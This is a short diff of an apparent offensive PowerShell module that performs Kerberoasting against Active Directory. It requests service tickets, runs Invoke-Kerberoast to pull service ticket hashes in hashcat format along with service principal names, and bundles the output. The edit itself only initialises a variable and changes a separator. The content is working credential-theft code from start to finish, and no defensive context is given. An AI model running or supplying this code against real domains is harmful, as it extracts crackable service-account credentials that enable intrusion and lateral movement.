@@ -13,7 +13,8 @@ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentL
 } | Out-String
 
 $kerb=Invoke-Kerberoast -OutputFormat hashcat | fl | Out-String
-(Invoke-Kerberoast -OutputFormat hashcat).Hash | ForEach-Object {$hash="$hash`n`n############`n$_"  } | Out-String
+$hash=""
+(Invoke-Kerberoast -OutputFormat hashcat).Hash | ForEach-Object {$hash="$hash`n`n*******`n$_"  } | Out-String
 $SPN2=(Invoke-Kerberoast).ServicePrincipalName | out-string
 $out="Kerberoast-Module `n`n############`n$SPN`n`n############`n$tickets`n`n############`n$kerb$hash"
 
